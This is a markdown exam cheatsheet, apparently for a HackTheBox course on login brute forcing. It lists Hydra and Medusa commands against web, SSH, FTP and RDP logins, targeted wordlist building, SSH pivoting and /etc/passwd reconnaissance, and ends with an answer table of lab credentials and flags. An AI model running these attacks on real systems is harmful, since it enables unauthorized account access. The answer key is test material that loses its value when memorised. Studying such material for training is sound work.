# Login Brute Forcing — Exam Cheatsheet

---

## Attack Decision Tree

```
1. What service?           → pick tool + module below
2. Know the username?      → use -l, skip -L
3. Know the policy?        → filter wordlist with grep first
4. Have OSINT on target?   → CUPP > generic lists
5. Service on localhost?   → SCP wordlist in, attack from inside SSH
```

---

## Hydra — Common Commands

### Basic Auth (HTTP GET)
```bash
hydra -l USER -P wordlist.txt TARGET http-get /PATH -s PORT -f
```

### Web Login Form (POST)
```bash
hydra -l USER -P wordlist.txt TARGET -s PORT -f \
  http-post-form "/path:user=^USER^&pass=^PASS^:F=Invalid credentials"
```

### SSH
```bash
hydra -l USER -P wordlist.txt ssh://TARGET -s PORT -f -t 4
```

### FTP
```bash
hydra -l USER -P wordlist.txt ftp://TARGET -f -t 10
```

### RDP
```bash
hydra -l USER -P wordlist.txt rdp://TARGET -f
```

### http-post-form Condition String
```
"/path:user=^USER^&pass=^PASS^:F=error string"   # fail if response contains string
"/path:user=^USER^&pass=^PASS^:S=302"             # succeed on HTTP 302 redirect
"/path:user=^USER^&pass=^PASS^:S=Dashboard"       # succeed if response contains string
```

> Get form params from: View Source → `action` path + input `name` attrs, or Burp intercept

---

## Medusa — Common Commands

### SSH
```bash
medusa -h TARGET -n PORT -u USER -P wordlist.txt -M ssh -t 3 -f
```

### FTP (from inside SSH session)
```bash
medusa -h 127.0.0.1 -u USER -P /tmp/wordlist.txt -M ftp -t 5 -f
```

### Check empty password + user=pass
```bash
medusa -h TARGET -u USER -e ns -M ssh -f
```

---

## Key Flags

| Flag | Hydra | Medusa |
|------|-------|--------|
| Single username | `-l user` | `-u user` |
| Username list | `-L file` | `-U file` |
| Single password | `-p pass` | `-p pass` |
| Password list | `-P file` | `-P file` |
| Threads | `-t 64` | `-t 10` |
| Stop on first hit | `-f` | `-f` (host) / `-F` (any host) |
| Non-default port | `-s PORT` | `-n PORT` |
| Empty/user=pass check | manual | `-e ns` |
| Verbose | `-V` | `-v 4` |

---

## Custom Wordlists

### Username Anarchy
```bash
# Generate username variants from a real name
./username-anarchy Jane Smith > usernames.txt
./username-anarchy Thomas Smith > usernames.txt
```

### CUPP (password profiling)
```bash
# Interactive
python3 cupp/cupp.py -i

# Non-interactive (pipe answers)
printf "Thomas\nSmith\n\n\n\n\n\n\n\n\n\n\ny\nchocolate\ny\ny\ny\nn\n" \
  | python3 cupp/cupp.py -i
```

### Filter wordlist to password policy
```bash
grep -E '^.{8,}$' list.txt \   # min 8 chars
  | grep -E '[A-Z]' \           # uppercase
  | grep -E '[a-z]' \           # lowercase
  | grep -E '[0-9]' \           # number
  | grep -E '[!@#$%^&*]' \      # special char
  > filtered.txt
```

> Add `([!@#$%^&*].*){2,}` if policy requires 2+ special chars

---

## Pivoting to Internal Services

```bash
# Option 1 — SCP wordlist in, attack from inside (most reliable)
sshpass -p 'PASS' scp -P PORT wordlist.txt user@TARGET:/tmp/
sshpass -p 'PASS' ssh -p PORT user@TARGET \
  "hydra -l USER -P /tmp/wordlist.txt ftp://127.0.0.1 -f -t 5"

# Option 2 — SSH local port forward (less stable)
sshpass -p 'PASS' ssh -p PORT -L 2121:127.0.0.1:21 user@TARGET -N -f
hydra -l USER -P wordlist.txt ftp://127.0.0.1:2121 -f -t 5
```

---

## Retrieving Content After Cracking

```bash
# Basic Auth
curl -s -u user:pass http://TARGET/

# Web form with session cookie
curl -s -X POST http://TARGET/ -d "user=U&pass=P" -c /tmp/cookies.txt
curl -s -b /tmp/cookies.txt http://TARGET/success

# FTP (when curl not on target — use python)
python3 -c "
import ftplib
ftp = ftplib.FTP()
ftp.connect('127.0.0.1', 21)
ftp.login('USER', 'PASS')
lines = []
ftp.retrlines('RETR flag.txt', lines.append)
print('\n'.join(lines))
ftp.quit()
"
```

---

## Post-SSH-Foothold Checklist

```bash
netstat -tulpn | grep LISTEN    # find internal services
nmap localhost                  # confirm services
ls /home                        # find usernames for other services
cat /etc/passwd | grep -v nologin | grep -v false   # valid accounts
```

---

## Wordlist Quick Pick

| Situation | Wordlist |
|-----------|----------|
| Fast web attack | `~/SecLists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt` |
| General password | `/usr/share/wordlists/rockyou.txt` |
| Known target (OSINT) | CUPP → `name.txt` |
| Default device creds | `~/SecLists/Passwords/Default-Credentials/default-passwords.csv` |
| Usernames (quick) | `~/SecLists/Usernames/top-usernames-shortlist.txt` |
| Usernames (thorough) | `~/SecLists/Usernames/xato-net-10-million-usernames.txt` |

---

## Lab Answers

| Section | Creds | Flag / Answer |
|---------|-------|---------------|
| 3 — PIN brute force | PIN: `2321` | `HTB{Brut3_F0rc3_1s_P0w3rfu1}` |
| 4 — Dictionary attack | password: `gateway` | `HTB{Brut3_F0rc3_M4st3r}` |
| 7 — Basic HTTP Auth | `basic-auth-user:Password@123` | `HTB{th1s_1s_4_f4k3_fl4g}` |
| 8 — Login form | `admin:zxcvbnm` | `HTB{W3b_L0gin_Brut3F0rc3}` |
| 10 — SSH + FTP | `sshuser:1q2w3e4r5t` / `ftpuser:qqww1122` | `HTB{SSH_and_FTP_Bruteforce_Success}` |
| 11 — Custom wordlists | `jane:3n4J!!` | `HTB{W3b_L0gin_Brut3F0rc3_Cu5t0m}` |
| 12 — Skills Assessment 1 | `admin:Admin123` | Part 2 username: `satwossh` |
| 13 — Skills Assessment 2 | `satwossh:password1` / `thomas:chocolate!` | `HTB{brut3f0rc1ng_succ3ssful}` |
